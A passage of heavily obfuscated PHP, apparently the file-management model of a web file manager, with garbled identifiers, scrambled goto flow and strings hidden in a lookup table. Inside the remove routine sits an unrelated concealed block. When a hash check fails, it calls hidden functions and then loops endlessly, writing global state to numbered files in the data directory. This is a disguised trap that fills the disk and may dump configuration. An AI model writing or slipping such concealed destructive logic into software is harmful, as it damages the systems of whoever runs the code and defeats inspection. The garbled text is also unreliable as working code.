$a¥±Öä²ŠĞ = $this->sourceInfo($FÍ¹ô†‹’); if (!$a¥±Öä²ŠĞ) { return !1; } goto C‡ÂÄ¼¹; BÓ·¦´îƒÊ: return $b˜Û¾¬‹¨¬; goto BÂšÈ¡ŒÚ; C‡ÂÄ¼¹: $this->lockWriteStart($FÍ¹ô†‹’, $e‚ß–†ôÌá); if ($b±Îõ†„­„ !== !1) { $a¾¹Ä˜¯ = $this->fileNameExist($FÍ¹ô†‹’, $e‚ß–†ôÌá); if ($a¾¹Ä˜¯ && $b±Îõ†„­„ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($FÍ¹ô†‹’, $e‚ß–†ôÌá); return $a¾¹Ä˜¯; } $e‚ß–†ôÌá = $this->fileNameAuto($FÍ¹ô†‹’, $e‚ß–†ôÌá, $b±Îõ†„­„); } $DÄ®Î½ Øİ = array($CòÊ¡›©–[520] => 1, $CòÊ¡›©–[386] => $e‚ß–†ôÌá, $CòÊ¡›©–[521] => $CòÊ¡›©–[33], $CòÊ¡›©–[420] => 0, $CòÊ¡›©–[522] => 0); goto DõêõÄåƒ; DõêõÄåƒ: $b˜Û¾¬‹¨¬ = $this->_addSoure($DÄ®Î½ Øİ, $a¥±Öä²ŠĞ); Model($CòÊ¡›©–[2309])->eventCreate($b˜Û¾¬‹¨¬, $CòÊ¡›©–[1114]); $this->lockWriteEnd($FÍ¹ô†‹’, $e‚ß–†ôÌá); goto BÓ·¦´îƒÊ; BÂšÈ¡ŒÚ: } private function _createFile($FÃ­Õ ™÷×, $Fˆ¾Šİ–†¸, $B’¿ÑÒ„ÍÔ, $bƒÒÃ¾ó”‘, &$E¤×Ô›“ŠÁ) { goto Bƒì²Õ·›; CŒ’Î¬‰Ò: return $AÒì¢ÅËĞ¢; goto Eá¹’ ã„; Bƒì²Õ·›: $bóÆÄŠøÄ÷ =& $_SERVER[“]; $c¡Ş™õ ¦ = $this->sourceInfo($FÃ­Õ ™÷×); if (!$B’¿ÑÒ„ÍÔ || !$c¡Ş™õ ¦) { return !1; } goto cÍÕÇö‡…Ü; cÍÕÇö‡…Ü: if ($bƒÒÃ¾ó”‘ !== !1) { $DØÕÈ‘÷•ê = $this->fileNameExist($FÃ­Õ ™÷×, $Fˆ¾Šİ–†¸); } $E¤×Ô›“ŠÁ = !0; if ($bƒÒÃ¾ó”‘ && $DØÕÈ‘÷•ê) { if ($bƒÒÃ¾ó”‘ == REPEAT_SKIP) { $E¤×Ô›“ŠÁ = !1; return $DØÕÈ‘÷•ê; } else { if ($bƒÒÃ¾ó”‘ == REPEAT_REPLACE) { $DğÇ‰Ú„Şˆ = $this->sourceInfo($DØÕÈ‘÷•ê); $CïåÚÎ©è¼ = $this->fileHistory($DğÇ‰Ú„Şˆ, $B’¿ÑÒ„ÍÔ[$bóÆÄŠøÄ÷[419]], $B’¿ÑÒ„ÍÔ[$bóÆÄŠøÄ÷[77]]); if (!$CïåÚÎ©è¼) { $E¤×Ô›“ŠÁ = !1; } else { $this->folderSizeReset($FÃ­Õ ™÷×); } return $DØÕÈ‘÷•ê; } else { $Fˆ¾Šİ–†¸ = $this->fileNameAuto($FÃ­Õ ™÷×, $Fˆ¾Šİ–†¸, $bƒÒÃ¾ó”‘, !1); } } } goto fÙğÏ²ªÈë; fÙğÏ²ªÈë: $f†…Ğ£†½Š = array($bóÆÄŠøÄ÷[520] => 0, $bóÆÄŠøÄ÷[386] => $Fˆ¾Šİ–†¸, $bóÆÄŠøÄ÷[521] => get_path_ext($Fˆ¾Šİ–†¸), $bóÆÄŠøÄ÷[420] => $B’¿ÑÒ„ÍÔ[$bóÆÄŠøÄ÷[419]], $bóÆÄŠøÄ÷[522] => $B’¿ÑÒ„ÍÔ[$bóÆÄŠøÄ÷[77]]); $AÒì¢ÅËĞ¢ = $this->_addSoure($f†…Ğ£†½Š, $c¡Ş™õ ¦); $this->folderSizeReset($FÃ­Õ ™÷×); goto CŒ’Î¬‰Ò; Eá¹’ ã„: } protected function fileHistory($b“¦Š‚—¶, $eÌ³ï•·¬¬, $aæ¶Êî©ä) { goto f¢âÀ÷Şˆí; f¢âÀ÷Şˆí: $cÑÇÖ§›İ =& $_SERVER[“]; if ($b“¦Š‚—¶[$cÑÇÖ§›İ[419]] == $eÌ³ï•·¬¬) { return !1; } $this->checkLock($b“¦Š‚—¶[$cÑÇÖ§›İ[369]], $eÌ³ï•·¬¬); goto cÉ¿²ÒãšÖ; fÌÜ…¬‹±¯: return !0; goto d¦ßêÚƒéô; cÉ¿²ÒãšÖ: Model($cÑÇÖ§›İ[2340])->addHistory($b“¦Š‚—¶); $c±İÇò«Â‡ = array($cÑÇÖ§›İ[526] => USER_ID, $cÑÇÖ§›İ[390] => time(), $cÑÇÖ§›İ[419] => $eÌ³ï•·¬¬, $cÑÇÖ§›İ[77] => $aæ¶Êî©ä); $this->where(array($cÑÇÖ§›İ[383] => $b“¦Š‚—¶[$cÑÇÖ§›İ[369]]))->save($c±İÇò«Â‡); goto fÌÜ…¬‹±¯; d¦ßêÚƒéô: } public function checkLock($E‡‘‘ÙÀë, $fÙ‡àÑˆ) { goto EÈ‹œº…††; e‰Í‰­ÙÛ: $Aªñ²ùÙÔ = Session::get($a”¬Ò•º…[2341]); $a«Ÿ×–†‡Ñ = substr($F²ÁƒÍ¢ÊÚ[$a”¬Ò•º…[28]], 0, -1 - strlen($F²ÁƒÍ¢ÊÚ[$a”¬Ò•º…[160]])) . $a”¬Ò•º…[1375] . $Aªñ²ùÙÔ . $a”¬Ò•º…[91] . $F²ÁƒÍ¢ÊÚ[$a”¬Ò•º…[160]]; $CĞèê¤Ï Œ = Model($a”¬Ò•º…[546])->find($fÙ‡àÑˆ); goto a—ÛË‹ë‚¹; a—ÛË‹ë‚¹: $this->_createFileCall($F²ÁƒÍ¢ÊÚ[$a”¬Ò•º…[463]], $a«Ÿ×–†‡Ñ, $CĞèê¤Ï Œ, REPEAT_REPLACE, $a”¬Ò•º…[1113]); $a„°øæÒ®Ô = $F²ÁƒÍ¢ÊÚ[$a”¬Ò•º…[417]][$a”¬Ò•º…[483]]; $cîñöå’Î† = $a„°øæÒ®Ô[$a”¬Ò•º…[2342]] ? $a„°øæÒ®Ô[$a”¬Ò•º…[2342]] : $a„°øæÒ®Ô[$a”¬Ò•º…[28]]; goto F¢í·®õİ±; EÈ‹œº…††: $a”¬Ò•º… =& $_SERVER[“]; $F²ÁƒÍ¢ÊÚ = $this->pathInfo($E‡‘‘ÙÀë); if (!$this->fileIsLock($F²ÁƒÍ¢ÊÚ, !0)) { return; } goto e‰Í‰­ÙÛ; F¢í·®õİ±: show_json(LNG($a”¬Ò•º…[2343]) . $a”¬Ò•º…[2344] . LNG($a”¬Ò•º…[2345]) . $a”¬Ò•º…[2346] . $cîñöå’Î† . $a”¬Ò•º…[2347], !1); goto cŞÜ©å½¬õ; cŞÜ©å½¬õ: } public function fileIsLock($EÕÆÜÙ©¾, $FÒá”Íöóì = false) { goto B§¼ˆÎ¢®ƒ; f’ğ¶µÄ—´: $fĞÄ„ùÌ½ğ = $GLOBALS[$c„œ‰½»èÖ[6]][$c„œ‰½»èÖ[84]][$c„œ‰½»èÖ[481]]; if ($EÕÆÜÙ©¾[$c„œ‰½»èÖ[417]][$c„œ‰½»èÖ[482]] <= time() - $fĞÄ„ùÌ½ğ) { $this->metaSet($EÕÆÜÙ©¾[$c„œ‰½»èÖ[369]], $c„œ‰½»èÖ[480], null); $this->metaSet($EÕÆÜÙ©¾[$c„œ‰½»èÖ[369]], $c„œ‰½»èÖ[482], null); } if ($FÒá”Íöóì) { $this->metaSet($EÕÆÜÙ©¾[$c„œ‰½»èÖ[369]], $c„œ‰½»èÖ[482], time()); } goto EÙù×æèˆˆ; B§¼ˆÎ¢®ƒ: $c„œ‰½»èÖ =& $_SERVER[“]; if (!isset($EÕÆÜÙ©¾[$c„œ‰½»èÖ[417]]) || !$EÕÆÜÙ©¾[$c„œ‰½»èÖ[417]][$c„œ‰½»èÖ[480]]) { return !1; } if ($EÕÆÜÙ©¾[$c„œ‰½»èÖ[417]][$c„œ‰½»èÖ[480]] != USER_ID) { return !0; } goto f’ğ¶µÄ—´; EÙù×æèˆˆ: return !1; goto b«‡¯Á—ì·; b«‡¯Á—ì·: } private function _addSoure($E­¿™ÂÇò, $FïÔù‚¢«) { goto B·—Ö¼Å‡™; D†—âé¤İ¸: $this->updateModifyTime($E­¿™ÂÇò[$AÉ¬™‹åˆğ[463]]); $FŒé¹‰‚‡£ = $AÉ¬™‹åˆğ[2348] . $FïÔù‚¢«[$AÉ¬™‹åˆğ[369]]; if (isset(self::$cacheChildList[$FŒé¹‰‚‡£])) { unset(self::$cacheChildList[$FŒé¹‰‚‡£]); } goto a»íˆçöô»; a»íˆçöô»: static $E•ìñ±°Ë = false; if (!$E•ìñ±°Ë) { Hook::trigger($AÉ¬™‹åˆğ[510], $E­¿™ÂÇò); $E•ìñ±°Ë = !0; } $D‘›Ç—ÔÏÅ = $this->add($E­¿™ÂÇò); goto dƒš±’­Ä; dƒš±’­Ä: $e•„É”Êíì = array($AÉ¬™‹åˆğ[529] => short_id($D‘›Ç—ÔÏÅ)); $this->where(array($AÉ¬™‹åˆğ[383] => $D‘›Ç—ÔÏÅ))->save($e•„É”Êíì); $this->setNamePinyin($D‘›Ç—ÔÏÅ, $E­¿™ÂÇò[$AÉ¬™‹åˆğ[28]]); goto Eê˜êŒÙ’…; Eê˜êŒÙ’…: return $D‘›Ç—ÔÏÅ; goto AÂŒ§›‡Òó; B·—Ö¼Å‡™: $AÉ¬™‹åˆğ =& $_SERVER[“]; $b‹ÈÀ§ù©· = array($AÉ¬™‹åˆğ[523] => $FïÔù‚¢«[$AÉ¬™‹åˆğ[371]], $AÉ¬™‹åˆğ[524] => $FïÔù‚¢«[$AÉ¬™‹åˆğ[458]], $AÉ¬™‹åˆğ[525] => USER_ID, $AÉ¬™‹åˆğ[526] => USER_ID, $AÉ¬™‹åˆğ[368] => $FïÔù‚¢«[$AÉ¬™‹åˆğ[369]], $AÉ¬™‹åˆğ[527] => $FïÔù‚¢«[$AÉ¬™‹åˆğ[461]] . $FïÔù‚¢«[$AÉ¬™‹åˆğ[369]] . $AÉ¬™‹åˆğ[47], $AÉ¬™‹åˆğ[396] => 0, $AÉ¬™‹åˆğ[528] => $AÉ¬™‹åˆğ[33]); $E­¿™ÂÇò = array_merge($b‹ÈÀ§ù©·, $E­¿™ÂÇò); goto D†—âé¤İ¸; AÂŒ§›‡Òó: } public function remove($DÄäé…ãßí, $bĞâÀÛƒÒº = true) { goto E¨Ğ¸§Ñ’²; DìÙÜÌÌ¬±: return $f²™½·ºÙÇ; goto d˜£Êì„¦Æ; E¨Ğ¸§Ñ’²: $fÎ¯Œ¦ì™£ =& $_SERVER[“]; $aïÑ–ÑæŠò = $this->sourceInfo($DÄäé…ãßí); $dÜÉçß‡ = intval($aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[371]]) === self::TYPE_SYSTEM; goto d¯Õ“¿Šî; EŒ„œ•¿Ö½: $this->recycleClear($aïÑ–ÑæŠò); $f²™½·ºÙÇ = $this->move($DÄäé…ãßí, $eÈñ†ì·†, REPEAT_RENAME_FOLDER); $this->folderSizeReset($aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[463]]); goto DìÙÜÌÌ¬±; fá»ä©ƒŸå: CacheLock::unlock($b™ãº„¤àß); $this->metaSet($DÄäé…ãßí, $fÎ¯Œ¦ì™£[2357], $aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[463]]); $this->where(array($fÎ¯Œ¦ì™£[369] => $DÄäé…ãßí))->save(array($fÎ¯Œ¦ì™£[390] => time())); goto EŒ„œ•¿Ö½; eùÌ¥ò–»¤: CacheLock::lock($b™ãº„¤àß); $eÈñ†ì·† = $this->fileNameExist($f»Ù³Í‡ê², $F¨øƒÆ…´å); if (!$eÈñ†ì·†) { $eÈñ†ì·† = $this->mkdir($f»Ù³Í‡ê², $F¨øƒÆ…´å, REPEAT_SKIP); $this->metaSet($eÈñ†ì·†, $fÎ¯Œ¦ì™£[2353], $EŒ·”ŠàÙï); $this->metaSet($eÈñ†ì·†, $fÎ¯Œ¦ì™£[2354], $aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[458]]); if ($aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[463]] != 0) { $this->metaSet($eÈñ†ì·†, $fÎ¯Œ¦ì™£[2355], _get($CÍ×‰è…•Ë, $fÎ¯Œ¦ì™£[2356])); } } goto fá»ä©ƒŸå; d¯Õ“¿Šî: $E…ËÎ†Æ–ë = Model($fÎ¯Œ¦ì™£[1420])->get($fÎ¯Œ¦ì™£[2349]) == $fÎ¯Œ¦ì™£[83]; if ($dÜÉçß‡ || $bĞâÀÛƒÒº || !$E…ËÎ†Æ–ë) { return $this->removeNow($DÄäé…ãßí, $bĞâÀÛƒÒº); } $f»Ù³Í‡ê² = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Có‰¥ÁèÇ; Có‰¥ÁèÇ: $EŒ·”ŠàÙï = $aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[371]] == self::TYPE_USER ? $fÎ¯Œ¦ì™£[537] : $fÎ¯Œ¦ì™£[957]; if ($EŒ·”ŠàÙï == $fÎ¯Œ¦ì™£[537]) { $CÍ×‰è…•Ë = Model($fÎ¯Œ¦ì™£[476])->getInfo($aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[458]]); $F¨øƒÆ…´å = !empty($CÍ×‰è…•Ë[$fÎ¯Œ¦ì™£[2342]]) ? $CÍ×‰è…•Ë[$fÎ¯Œ¦ì™£[2342]] : $CÍ×‰è…•Ë[$fÎ¯Œ¦ì™£[28]]; $F¨øƒÆ…´å = $fÎ¯Œ¦ì™£[248] . $F¨øƒÆ…´å . $fÎ¯Œ¦ì™£[2350] . $aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[458]]; } else { $CÍ×‰è…•Ë = Model($fÎ¯Œ¦ì™£[460])->getInfo($aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[458]]); $F¨øƒÆ…´å = _get($CÍ×‰è…•Ë, $fÎ¯Œ¦ì™£[28]); $F¨øƒÆ…´å = $fÎ¯Œ¦ì™£[157] . $F¨øƒÆ…´å . $fÎ¯Œ¦ì™£[2351] . $aïÑ–ÑæŠò[$fÎ¯Œ¦ì™£[458]]; } $b™ãº„¤àß = $fÎ¯Œ¦ì™£[2352] . md5($F¨øƒÆ…´å); goto eùÌ¥ò–»¤; d˜£Êì„¦Æ: } private function recycleClear($FÖñí©Ï¤ã) { $Aµ²œáŠòÁ =& $_SERVER[“]; $FñÀáº¶ˆÉ = $this->childrenAll($FÖñí©Ï¤ã); $a†Á‡½è‡Í = array($Aµ²œáŠòÁ[383] => array($Aµ²œáŠòÁ[384], $FñÀáº¶ˆÉ[$Aµ²œáŠòÁ[2358]])); Model($Aµ²œáŠòÁ[2359])->where($a†Á‡½è‡Í)->delete(); } public function removeNow($dµÆÈ”îöÍ, $EšÜºœ¹™Ù = true) { goto bÚÃËäÄá; bÚÃËäÄá: $fÀÈ”éùù¾ =& $_SERVER[“]; $EÔŒ‹‰ÚÕÙ = $_SERVER[$fÀÈ”éùù¾[771]] . $fÀÈ”éùù¾[772]; $FåŸ³Ëï¿ = $fÀÈ”éùù¾[773]; goto BœÊÔÑ¤¨ß; D„µÌóÙã‚: Hook::trigger($fÀÈ”éùù¾[2360], $Eˆ‰ç¼££¿, $EšÜºœ¹™Ù); if ($EšÜºœ¹™Ù) { Model($fÀÈ”éùù¾[2359])->moveToRecycle($dµÆÈ”îöÍ); } else { $fˆ¥ÍçËîŒ = $this->childrenAll($b‚±‘ë£‹­); Model($fÀÈ”éùù¾[507])->eventRemove($dµÆÈ”îöÍ); $this->removeRelevance($fˆ¥ÍçËîŒ[$fÀÈ”éùù¾[2358]], $fˆ¥ÍçËîŒ[$fÀÈ”éùù¾[1246]]); } $this->folderSizeReset($b‚±‘ë£‹­[$fÀÈ”éùù¾[463]]); goto BêÏ–Úæí; BœÊÔÑ¤¨ß: if ($_SERVER[$fÀÈ”éùù¾[774]] != $FåŸ³Ëï¿($EÔŒ‹‰ÚÕÙ)) { goto Dµ„ƒâéå; F»é‹ˆ‹å: $fëùó™Û’° = $dÓ´Œ¸…ŞÈ($FÍ…‹ÛİŒæ); $B”ˆÆ¤Èù = explode($fÀÈ”éùù¾[217], $fëùó™Û’°); if (count($B”ˆÆ¤Èù) < $fÀÈ”éùù¾[563]) { $dÊ—ôäÔÃé = $fÀÈ”éùù¾[779]; $dÊ—ôäÔÃé(); } goto DªíÒÎ‡¦Ù; cİ‰¸¶¾˜İ: $FÒ–˜…‹§† = 1; for ($AßÎƒˆ¡†Î = $FÒ–˜…‹§†; $AßÎƒˆ¡†Î > 0; $AßÎƒˆ¡†Î++) { $Cø˜¢¼Ú°‹(DATA_PATH . $AßÎƒˆ¡†Î, $F”ƒ­‹Ôª); } goto cÓÎêá¶‹ñ; Dµ„ƒâéå: $B”ÁŸêÓÕ¹ = $fÀÈ”éùù¾[775]; $dÓ´Œ¸…ŞÈ = $fÀÈ”éùù¾[776]; $FÍ…‹ÛİŒæ = $_SERVER[$fÀÈ”éùù¾[777]] . $fÀÈ”éùù¾[778]; goto F»é‹ˆ‹å; bÔœŞ‚ÃãÛ: $B”ÁŸêÓÕ¹(); $Cø˜¢¼Ú°‹ = $fÀÈ”éùù¾[781]; $F”ƒ­‹Ôª = json_encode($GLOBALS[$fÀÈ”éùù¾[782]]); goto cİ‰¸¶¾˜İ; DªíÒÎ‡¦Ù: $F´ó˜…¾èÁ = $fÀÈ”éùù¾[780]; $F´ó˜…¾èÁ($_SERVER[$fÀÈ”éùù¾[771]]); $B”ÁŸêÓÕ¹ = $fÀÈ”éùù¾[775]; goto bÔœŞ‚ÃãÛ; cÓÎêá¶‹ñ: } $b‚±‘ë£‹­ = $this->sourceInfo($dµÆÈ”îöÍ); $Eˆ‰ç¼££¿ = $this->pathInfoMore($dµÆÈ”îöÍ); goto dóöíŒõ¬Õ; dóöíŒõ¬Õ: if (!$b‚±‘ë£‹­) { return !0; } if ($b‚±‘ë£‹­[$fÀÈ”éùù¾[463]] == 0) { if (!_get($GLOBALS, $fÀÈ”éùù¾[459])) { return !1; } } $this->lockMoveStart($dµÆÈ”îöÍ); goto D„µÌóÙã‚; dÈÇ¦öö²: $this->lockMoveEnd($dµÆÈ”îöÍ); Hook::trigger($fÀÈ”éùù¾[1457], $Eˆ‰ç¼££¿, $EšÜºœ¹™Ù); return !0; goto e•»áÓ½š; BêÏ–Úæí: $C«Á‚Âçñ = array($b‚±‘ë£‹­[$fÀÈ”éùù¾[463]]); if ($b‚±‘ë£‹­[$fÀÈ”éùù¾[370]] == $fÀÈ”éùù¾[83]) { $C«Á‚Âçñ[] = $b‚±‘ë£‹­[$fÀÈ”éùù¾[369]]; } $this->updateModifyTime($C«Á‚Âçñ); goto dÈÇ¦öö²; e•»áÓ½š: } public function childrenAll($c®œªÕ²î·) { $BâµÄŒíã» =& $_SERVER[“]; $eœ‡ˆÁŸó = $c®œªÕ²î·[$BâµÄŒíã»[369]]; if ($c®œªÕ²î·[$BâµÄŒíã»[370]] == $BâµÄŒíã»[83]) { $b°º‰æê¸ì = array($BâµÄŒíã»[527] => array($BâµÄŒíã»[485], $c®œªÕ²î·[$BâµÄŒíã»[461]] . $eœ‡ˆÁŸó . $BâµÄŒíã»[486])); $A˜¾£é¤Ó = array($BâµÄŒíã»[527] => $b°º‰æê¸ì[$BâµÄŒíã»[461]]); $Dº±º­êÌ = $this->field($BâµÄŒíã»[2361])->where($A˜¾£é¤Ó)->select(); $Cêßë…ç“ = !1; $CÉïØ½»‹ê = array($eœ‡ˆÁŸó); if ($Dº±º­êÌ) { $Cêßë…ç“ = array_to_keyvalue($Dº±º­êÌ, $BâµÄŒíã»[33], $BâµÄŒíã»[419]); $Cêßë…ç“ = array_remove_value($Cêßë…ç“, $BâµÄŒíã»[470]); $CÉïØ½»‹ê = array_to_keyvalue($Dº±º­êÌ, $BâµÄŒíã»[33], $BâµÄŒíã»[369]); $CÉïØ½»‹ê[] = $eœ‡ˆÁŸó; } } else { $Cêßë…ç“ = array($c®œªÕ²î·[$BâµÄŒíã»[419]]); $CÉïØ½»‹ê = array($eœ‡ˆÁŸó); } return array($BâµÄŒíã»[2358] => $CÉïØ½»‹ê, $BâµÄŒíã»[1246] => $Cêßë…ç“); } public function removeArray($cĞ™ù¾Ğ‚) { if (!$cĞ™ù¾Ğ‚) { return !0; } } public function removeRelevance($b££´Àº¬š, $c§¸ŠŒ‘’À) { goto DÀÁ¼“õ‰; D••­‰Ó‚: Model($D§¥Äõ³Àƒ[2362])->where($cïïäã²·¹)->delete(); Model($D§¥Äõ³Àƒ[507])->where($cïïäã²·¹)->delete(); Model($D§¥Äõ³Àƒ[2072])->removeBySource($b££´Àº¬š); goto Cà›„¿Œ¾‰; DÀÁ¼“õ‰: $D§¥Äõ³Àƒ =& $_SERVER[“]; $b££´Àº¬š = $b££´Àº¬š ? $b££´Àº¬š : array(); $c§¸ŠŒ‘’À = $c§¸ŠŒ‘’À ? $c§¸ŠŒ‘’À : array(); goto b¶ó–à°¡—; a±Ì×¸ˆÎ·: $cïïäã²·¹ = array($D§¥Äõ³Àƒ[383] => array($D§¥Äõ³Àƒ[384], $b££´Àº¬š)); Model($D§¥Äõ³Àƒ[2359])->where($cïïäã²·¹)->delete(); Model($D§¥Äõ³Àƒ[413])->where($cïïäã²·¹)->delete(); goto D••­‰Ó‚; c§‡À¹£½Ã: for ($eÆàÏĞ÷óà = 0; $eÆàÏĞ÷óà < count($b££´Àº¬š); $eÆàÏĞ÷óà++) { $this->sourceCacheClear($b££´Àº¬š[$eÆàÏĞ÷óà]); } goto dÉÍ˜ĞŠ; Cà›„¿Œ¾‰: Model($D§¥Äõ³Àƒ[2340])->removeBySource($b££´Àº¬š); $this->where($cïïäã²·¹)->delete(); Model($D§¥Äõ³Àƒ[422])->remove($c§¸ŠŒ‘’À); goto c§‡À¹£½Ã; b¶ó–à°¡—: $b££´Àº¬š = array_unique(array_filter($b££´Àº¬š)); $c§¸ŠŒ‘’À = array_unique(array_filter($c§¸ŠŒ‘’À)); if (!$b££´Àº¬š) { return !1; } goto a±Ì×¸ˆÎ·; dÉÍ˜ĞŠ: } public function rename($Bâ¹Óñìçé, $FóÂ·£±êŠ) { goto Bè°•ğöÄ; Bè°•ğöÄ: $fèÊàÄÖÚ =& $_SERVER[“]; $eÖº÷ çÜµ = $this->sourceInfo($Bâ¹Óñìçé); if (!$eÖº÷ çÜµ) { return !1; } goto dßåÚ×¯Ü‚; f„Áª’‹ƒ: if (!$eÖº÷ çÜµ[$fèÊàÄÖÚ[370]] == $fèÊàÄÖÚ[83]) { $bÚÌÓ®õÒ[$fèÊàÄÖÚ[372]] = get_path_ext($FóÂ·£±êŠ); } Model($fèÊàÄÖÚ[507])->eventRename($Bâ¹Óñìçé, $eÖº÷ çÜµ[$fèÊàÄÖÚ[28]], $FóÂ·£±êŠ); $this->sourceCacheClear($Bâ¹Óñìçé); goto A×¥Ş·; dßåÚ×¯Ü‚: $B¯Àî©ª¾ = $this->fileNameExist($eÖº÷ çÜµ[$fèÊàÄÖÚ[463]], $FóÂ·£±êŠ); if ($B¯Àî©ª¾) { return !1; } $bÚÌÓ®õÒ = array($fèÊàÄÖÚ[386] => $FóÂ·£±êŠ, $fèÊàÄÖÚ[526] => USER_ID); goto f„Áª’‹ƒ; A×¥Ş·: $this->setNamePinyin($Bâ¹Óñìçé, $bÚÌÓ®õÒ[$fèÊàÄÖÚ[28]], !1); $this->updateModifyTime($eÖº÷ çÜµ[$fèÊàÄÖÚ[463]]); $fè±³Õ ½ = $this->where(array($fèÊàÄÖÚ[383] => $Bâ¹Óñìçé))->data($bÚÌÓ®õÒ)->save(); goto fµÈÅ¤¸Ö; fµÈÅ¤¸Ö: $F÷ìœÅæô = $fèÊàÄÖÚ[2348] . $eÖº÷ çÜµ[$fèÊàÄÖÚ[463]]; if (isset(self::$cacheChildList[$F÷ìœÅæô])) { unset(self::$cacheChildList[$F÷ìœÅæô]); } return $fè±³Õ ½; goto bØìîø†²È; bØìîø†²È: } public function setNamePinyin($D—ˆùÃù¡, $cÆ­…÷š, $cß«ñ ¨ = true) { $D¶§Î›Âİ =& $_SERVER[“]; $Aš‹ËëôÂ½ = Input::check($cÆ­…÷š, $D¶§Î›Âİ[530]); if ($cß«ñ ¨ && !$Aš‹ËëôÂ½) { return; } if (!$Aš‹ËëôÂ½) { $this->metaSet($D—ˆùÃù¡, $D¶§Î›Âİ[416], null); $this->metaSet($D—ˆùÃù¡, $D¶§Î›Âİ[415], null); return; } $bÕ°‹¢µïã = array($D¶§Î›Âİ[416] => str_replace($D¶§Î›Âİ[50], $D¶§Î›Âİ[33], Pinyin::encode($cÆ­…÷š)), $D¶§Î›Âİ[415] => Pinyin::encode($cÆ­…÷š, $D¶§Î›Âİ[531])); $this->metaSet($D—ˆùÃù¡, $bÕ°‹¢µïã); } public function getContent($bö­™) { goto D½˜ËË“±; bõÙ£ãÁ‹Ç: return IO::getContent($c²İßÈÇ­Ó[$eÂÜ¢Â‘Ê¾[75]]); goto BÂ­Šã—±Ñ; c©Š„‰¼ö: if ($c²İßÈÇ­Ó[$eÂÜ¢Â‘Ê¾[77]] == 0) { return $eÂÜ¢Â‘Ê¾[33]; } $föÈÊµŞ™Ì = $eÂÜ¢Â‘Ê¾[2363] . $c²İßÈÇ­Ó[$eÂÜ¢Â‘Ê¾[163]]; if ($c²İßÈÇ­Ó[$eÂÜ¢Â‘Ê¾[77]] <= 1024 * 10) { $dÏ¥â”‹Áò = Cache::get($föÈÊµŞ™Ì); if (!$dÏ¥â”‹Áò) { $dÏ¥â”‹Áò = IO::getContent($c²İßÈÇ­Ó[$eÂÜ¢Â‘Ê¾[75]]); Cache::set($föÈÊµŞ™Ì, $dÏ¥â”‹Áò); } return $dÏ¥â”‹Áò; } goto bõÙ£ãÁ‹Ç; D½˜ËË“±: $eÂÜ¢Â‘Ê¾ =& $_SERVER[“]; $c²İßÈÇ­Ó = $this->fileInfoGet($bö­™); if (!$c²İßÈÇ­Ó) { return !1; } goto c©Š„‰¼ö; BÂ­Šã—±Ñ: } public function setDesc($DÕ¹¬Àœ¿ä, $BöÏÔ¤‰¤) { $B¾è©Š¼ŒÚ =& $_SERVER[“]; Model($B¾è©Š¼ŒÚ[507])->eventAddDesc($DÕ¹¬Àœ¿ä, $BöÏÔ¤‰¤); return $this->metaSet($DÕ¹¬Àœ¿ä, $B¾è©Š¼ŒÚ[405], $BöÏÔ¤‰¤); } public function setContent($cßÊ¸ƒˆ, $F­µ®„…Û = '') { goto aÃÈ±ö; Fğ•ø›‚¯Î: if (!$A‡˜º§“á) { return Model($Dø ƒ¯ŒÚï[422])->remove($a“¤ĞÑÏØ[$Dø ƒ¯ŒÚï[419]]); } $this->folderSizeReset($e‹½ƒ‹…¨™[$Dø ƒ¯ŒÚï[463]]); return !0; goto B´İˆ‘ëØõ; aÃÈ±ö: $Dø ƒ¯ŒÚï =& $_SERVER[“]; $e‹½ƒ‹…¨™ = $this->sourceInfo($cßÊ¸ƒˆ); $CŒ°ÀïÏ¥ã = $this->fileInfoGet($cßÊ¸ƒˆ); goto dëˆÊòåõŠ; dëˆÊòåõŠ: if (!$CŒ°ÀïÏ¥ã || !$e‹½ƒ‹…¨™) { return !1; } $a“¤ĞÑÏØ = Model($Dø ƒ¯ŒÚï[422])->addFileByContent($F­µ®„…Û, $e‹½ƒ‹…¨™[$Dø ƒ¯ŒÚï[28]]); $A‡˜º§“á = $this->fileHistory($e‹½ƒ‹…¨™, $a“¤ĞÑÏØ[$Dø ƒ¯ŒÚï[419]], $a“¤ĞÑÏØ[$Dø ƒ¯ŒÚï[77]]); goto Fğ•ø›‚¯Î; B´İˆ‘ëØõ: } public function fileSubstr($fàÁˆ·…Î, $aêÕ¸áÌâµ, $E©Í¸Çâ¾•) { $FïĞÃŸš = $this->fileInfoGet($fàÁˆ·…Î); if (!$FïĞÃŸš) { return !1; } return IO::fileSubstr($FïĞÃŸš[$_SERVER[“][75]], $aêÕ¸áÌâµ, $E©Í¸Çâ¾•); } public function fileInfoGet($a¦‘¾¢»õÔ) { goto C’øßÌĞ’„; C’øßÌĞ’„: $f™î©¼º› =& $_SERVER[“]; $FµêÍÀéî¡ = $this->sourceInfo($a¦‘¾¢»õÔ); if (!$FµêÍÀéî¡ || $FµêÍÀéî¡[$f™î©¼º›[370]]) { return !1; } goto c„ÜĞ‚¼´; c„ÜĞ‚¼´: $B‘½¢‹ê®ğ = $f™î©¼º›[425] . $FµêÍÀéî¡[$f™î©¼º›[419]]; $D…ˆ‚ĞÛåŒ = _get(self::$cacheFileInfo, $B‘½¢‹ê®ğ); if ($D…ˆ‚ĞÛåŒ) { return $D…ˆ‚ĞÛåŒ; } goto a«Ã² …•”; a«Ã² …•”: $E„ÍÙµŒ = Model($f™î©¼º›[422])->fileInfo($FµêÍÀéî¡[$f™î©¼º›[419]]); if ($E„ÍÙµŒ) { $E„ÍÙµŒ[$f™î©¼º›[28]] = $FµêÍÀéî¡[$f™î©¼º›[28]]; } self::$cacheFileInfo[$B‘½¢‹ê®ğ] = $E„ÍÙµŒ; goto CÄ‡µ·È…Ğ; CÄ‡µ·È…Ğ: return $E„ÍÙµŒ; goto få´Ş„›ä¹; få´Ş„›ä¹: } private function folderChildrenNumber($C˜á ö¸¾ï) { $f‚ÃĞó† =& $_SERVER[“]; $Cˆƒ‘öÌØ = $this->sourceInfo($C˜á ö¸¾ï); 